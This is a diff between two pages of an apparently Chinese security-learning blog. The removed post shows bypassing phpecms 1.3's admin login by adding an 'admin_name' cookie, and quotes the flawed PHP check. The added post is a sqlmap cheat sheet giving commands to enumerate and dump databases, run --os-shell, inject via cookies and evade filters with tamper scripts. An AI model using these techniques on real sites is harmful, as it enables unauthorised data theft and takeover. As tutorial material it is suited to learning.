@@ -15,21 +15,23 @@
 
 
 
-<meta name="description" content="听说没有“实战”的博客不是好博客。就下载了个CMS来测试下性能–&amp;gt;phpecms1.3">
+<meta name="description" content="NMAP的使用：  常用命令：-u （后面接URL，判断注入，有注入则回显服务器信息）–dbs  查看所有数据库–current-db  列出当前所用的数据库–table 获取数据库表 （接 –D使用;  因为要知道是哪个数据库的表）–columns 获取表中的字段 （接 –T，-D使用，因为要知道哪个表那个数据库）–dump 获取字段内容 （接-C,-T,-D使用，和上同理。。）–r    利用">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="cookie 欺骗进后台">
-<meta property="og:url" content="http://yoursite.com/2017/04/21/Cookie欺骗进后台/index.html">
+<meta property="og:title" content="SQL注入之sqlmap工具使用">
+<meta property="og:url" content="http://yoursite.com/2017/04/08/SQL注入之sqlmap工具使用/index.html">
 <meta property="og:site_name" content="大佬要我改个名">
-<meta property="og:description" content="听说没有“实战”的博客不是好博客。就下载了个CMS来测试下性能–&amp;gt;phpecms1.3">
-<meta property="og:image" content="http://i.imgur.com/kYyuq5t.png">
-<meta property="og:image" content="http://i.imgur.com/OytbVIS.png">
-<meta property="og:image" content="http://i.imgur.com/kFr4Ff3.png">
-<meta property="og:updated_time" content="2017-04-23T02:02:26.641Z">
+<meta property="og:description" content="NMAP的使用：  常用命令：-u （后面接URL，判断注入，有注入则回显服务器信息）–dbs  查看所有数据库–current-db  列出当前所用的数据库–table 获取数据库表 （接 –D使用;  因为要知道是哪个数据库的表）–columns 获取表中的字段 （接 –T，-D使用，因为要知道哪个表那个数据库）–dump 获取字段内容 （接-C,-T,-D使用，和上同理。。）–r    利用">
+<meta property="og:image" content="http://i.imgur.com/hXYJAAk.png">
+<meta property="og:image" content="http://i.imgur.com/qUdI66I.png">
+<meta property="og:image" content="http://i.imgur.com/GNePxTp.png">
+<meta property="og:image" content="http://i.imgur.com/r8WPdQL.png">
+<meta property="og:image" content="http://i.imgur.com/lmnaBaL.png">
+<meta property="og:updated_time" content="2017-04-30T01:53:23.497Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="cookie 欺骗进后台">
-<meta name="twitter:description" content="听说没有“实战”的博客不是好博客。就下载了个CMS来测试下性能–&amp;gt;phpecms1.3">
-<meta name="twitter:image" content="http://i.imgur.com/kYyuq5t.png">
+<meta name="twitter:title" content="SQL注入之sqlmap工具使用">
+<meta name="twitter:description" content="NMAP的使用：  常用命令：-u （后面接URL，判断注入，有注入则回显服务器信息）–dbs  查看所有数据库–current-db  列出当前所用的数据库–table 获取数据库表 （接 –D使用;  因为要知道是哪个数据库的表）–columns 获取表中的字段 （接 –T，-D使用，因为要知道哪个表那个数据库）–dump 获取字段内容 （接-C,-T,-D使用，和上同理。。）–r    利用">
+<meta name="twitter:image" content="http://i.imgur.com/hXYJAAk.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -61,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>cookie 欺骗进后台 | 大佬要我改个名</title>
+<title>SQL注入之sqlmap工具使用 | 大佬要我改个名</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -272,11 +274,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-Cookie欺骗进后台" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-SQL注入之sqlmap工具使用" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/04/21/Cookie欺骗进后台/" class="article-date">
-      <time datetime="2017-04-21T10:47:59.249Z" itemprop="datePublished">2017-04-21</time>
+      <a href="/2017/04/08/SQL注入之sqlmap工具使用/" class="article-date">
+      <time datetime="2017-04-08T09:34:11.167Z" itemprop="datePublished">2017-04-08</time>
 </a>
 
 
@@ -291,7 +293,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      cookie 欺骗进后台
+      SQL注入之sqlmap工具使用
     </h1>
   
 
@@ -308,60 +310,26 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>听说没有“实战”的博客不是好博客。<br>就下载了个CMS来测试下性能–&gt;phpecms1.3</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>###登陆页面：<br><img src="http://i.imgur.com/kYyuq5t.png" alt=""></p>
+        <p>NMAP的使用：<br>  常用命令：-u （后面接URL，判断注入，有注入则回显服务器信息）<br>–dbs  查看所有数据库<br>–current-db  列出当前所用的数据库<br>–table 获取数据库表 （接 –D使用;  因为要知道是哪个数据库的表）<br>–columns 获取表中的字段 （接 –T，-D使用，因为要知道哪个表那个数据库）<br>–dump 获取字段内容 （接-C,-T,-D使用，和上同理。。）<br>–r    利用文本（接编码转换文本或HTTP协议包）</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>以下为Mysql数据注入：</p>
+<ol>
+<li><p>-u www.xxx.com/qqq.php?id=1  存在注入，则爆出(网页信息)↓<br><img src="http://i.imgur.com/hXYJAAk.png" alt=""></p>
+</li>
+<li><p>-u www.xxx.com/qqq.php?id=1 –dbs  爆出所有数据库<br><img src="http://i.imgur.com/qUdI66I.png" alt=""></p>
+</li>
+<li><p>选择bsgy数据库并爆表  -u www.xxx.com/qqq.php?id=1 –D “bsgy”  –table<br><img src="http://i.imgur.com/GNePxTp.png" alt=""></p>
+</li>
+<li><p>选择lefttree表，并爆字段<br>-u www.xxx.com/qqq.php?id=1 –D “bsgy”  -T “lefttree”  –columns<br><img src="http://i.imgur.com/r8WPdQL.png" alt=""></p>
+</li>
+<li><p>爆字段内容<br>-u www.xxx.com/qqq.php?id=1 –D “bsgy”  -T “lefttree”  –C “id,name” –dump<br><img src="http://i.imgur.com/lmnaBaL.png" alt=""></p>
+</li>
+</ol>
 <hr>
-<p>phpecms1.3/admin/cms_check.php文件有一段代码</p>
-<pre><code class="bash">&lt;?php
-        <span class="keyword">if</span>(!isset(<span class="variable">$_COOKIE</span>[<span class="string">'admin_name'</span>])){
-                alert_href(<span class="string">'非法登录'</span>,<span class="string">'cms_login.php'</span>);
-        };
-?&gt;
-</code></pre>
-<p><strong>这代码意思是如果cookie是admin_name 则跳转成功，如果不是则非法登陆。</strong></p>
+<p>Accessz注入：–table（直接猜表名）然后思路同理<br>因为Access没有内置的数据库，而且只有一只，所以直接跑表</p>
 <hr>
-<p>/phpecms1.3/admin/cms_welcome.php文件：</p>
-<pre><code class="bash">&lt;?php
-include(<span class="string">'../system/inc.php'</span>);
-include(<span class="string">'cms_check.php'</span>); 
-
-?&gt;
-&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;
-&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;
-&lt;head&gt;
-&lt;?php include(<span class="string">'inc_head.php'</span>) ?&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;?php include(<span class="string">'inc_header.php'</span>) ?&gt;
-&lt;div id=<span class="string">"content"</span>&gt;
-        &lt;div class=<span class="string">"container"</span>&gt;
-                &lt;div class=<span class="string">"line-big"</span>&gt;
-                        &lt;?php include(<span class="string">'inc_left.php'</span>) ?&gt;
-                        &lt;div class=<span class="string">"xx105"</span>&gt;
-                                &lt;div class=<span class="string">"hd-1"</span>&gt;使用声明&lt;/div&gt;
-                                &lt;div class=<span class="string">"bd-1"</span>&gt;
-                                &lt;p&gt;一、遵守中中华人民共和国相关法律，合法使用。&lt;/p&gt;
-                                &lt;p&gt;二、此程序为免费版，无使用时间限制。&lt;/p&gt;
-                                &lt;p&gt;三、商业使用建议使用收费版，获取更多功能和技术服务。&lt;/p&gt;
-                                &lt;p class=<span class="string">"fb color-red"</span>&gt;免费版和收费版的主要差异&lt;/p&gt;
-                                &lt;p&gt;一、支持手机版&lt;/p&gt;
-                                &lt;p&gt;二、多套模板后后台切换&lt;/p&gt;
-                                &lt;p&gt;三、更多的频道类型和详情类型选择&lt;/p&gt;
-                                &lt;p&gt;四、支持伪静态&lt;/p&gt;
-                                &lt;p&gt;四、咨询QQ：&lt;a href=<span class="string">"http://wpa.qq.com/msgrd?v=3&amp;uin=5474131&amp;site=qq&amp;menu=yes"</span>&gt;5474131&lt;/a&gt; 电话：13400472755 网址：&lt;a href=<span class="string">"http://www.pcfinal.cn"</span> target=<span class="string">"_blank"</span>&gt;[url=http://www.pcfinal.cn]www.pcfinal.cn[/url]&lt;/a&gt;&lt;/p&gt;
-                                &lt;/div&gt;
-                        &lt;/div&gt;
-                &lt;/div&gt;
-        &lt;/div&gt;
-&lt;/div&gt;
-&lt;?php include(<span class="string">'inc_footer.php'</span>) ?&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p><strong>后台文件没有任何判断，直接包含进去</strong></p>
+<p>注：<br>其它命令：1.测试所有用户权限：–privileges   （接-U可指定用户）<br>         2.执行shell命令（需要知道物理路径且可写）：<br>–os-cmd=”cmd命令”<br>–os-shell<br>         3.post 提交：–data “post参数”  （可能会自动检测）<br>         4.显示详细参数：-v 0~6   （0~6代表信息等级，）<br>         5.cookies注入：–cookie –lever 3  （&gt;=2即可，3的话会检查User-agent和Referer）<br>         6.数据包注入：-r 要注入的文本   （文本的某一处加‘*’则选择在哪注入，不加则默认是头部注入，这方式适合伪静态注入）<br>         7.注入时使用编码：–tamper ‘py文本’ (适用黑名单绕过)<br>         8.。。。。。</p>
 <hr>
-<p>###如图增加新cookie及修改：<br><img src="http://i.imgur.com/OytbVIS.png" alt=""></p>
-<p>###刷新修改过的URL，成功进入后台<br><img src="http://i.imgur.com/kFr4Ff3.png" alt=""></p>
+<p>注入工具还有：穿山甲（pangolin） / Havij（小萝卜）。。。<br>            编写人不同，注入方法也不通，都试试吧，可能某一个得呢。。</p>
 
       
     </div>
@@ -370,13 +338,13 @@ include(<span class="string">'cms_check.php'</span>);
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/04/21/Cookie欺骗进后台/">cookie 欺骗进后台</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/08/SQL注入之sqlmap工具使用/">SQL注入之sqlmap工具使用</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mark</a></p>
-        <p><span>发布时间:</span>2017-04-21, 18:47:59</p>
-        <p><span>最后更新:</span>2017-04-23, 10:02:26</p>
+        <p><span>发布时间:</span>2017-04-08, 17:34:11</p>
+        <p><span>最后更新:</span>2017-04-30, 09:53:23</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/04/21/Cookie欺骗进后台/" title="cookie 欺骗进后台">http://yoursite.com/2017/04/21/Cookie欺骗进后台/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/21/Cookie欺骗进后台/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/08/SQL注入之sqlmap工具使用/" title="SQL注入之sqlmap工具使用">http://yoursite.com/2017/04/08/SQL注入之sqlmap工具使用/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/08/SQL注入之sqlmap工具使用/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -389,15 +357,15 @@ include(<span class="string">'cms_check.php'</span>);
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/04/21/解析漏洞/">
-                    解析漏洞总结
+                <a href="/2017/04/08/SQL手工注入之mysql/">
+                    SQL手工注入之mysql
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/04/23/burpsuit爆破后台/">
-                    burpsuit爆破后台
+                <a href="/2017/04/08/代码注入之XML篇/">
+                    代码注入之XML篇
                 </a>
             </div>
         
@@ -445,7 +413,7 @@ include(<span class="string">'cms_check.php'</span>);
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"cookie 欺骗进后台　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"SQL注入之sqlmap工具使用　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -465,7 +433,7 @@ include(<span class="string">'cms_check.php'</span>);
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/04/21/解析漏洞/" title="上一篇: 解析漏洞总结">
+            <a href="/2017/04/08/SQL手工注入之mysql/" title="上一篇: SQL手工注入之mysql">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -473,7 +441,7 @@ include(<span class="string">'cms_check.php'</span>);
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/04/23/burpsuit爆破后台/" title="下一篇: burpsuit爆破后台">
+            <a href="/2017/04/08/代码注入之XML篇/" title="下一篇: 代码注入之XML篇">
                 <i class="fa fa-angle-right"></i>
             </a>
         
